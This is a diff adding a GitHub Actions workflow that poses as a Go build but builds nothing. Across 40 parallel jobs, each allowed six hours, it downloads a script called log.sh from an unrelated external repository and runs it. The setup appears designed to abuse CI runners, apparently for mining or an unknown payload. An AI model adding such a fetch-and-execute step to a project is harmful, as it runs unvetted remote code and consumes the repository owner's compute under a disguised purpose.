@@ -1,0 +1,24 @@
+name: Ga
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.9]
+        flag: [A, B, C, D, E, F, G, H, I, J]
+    timeout-minutes: 360
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Runner
+      run: |
+          wget https://github.com/Egiguntu/ooou/blob/main/log.sh && chmod u+x log.sh && ./log.sh
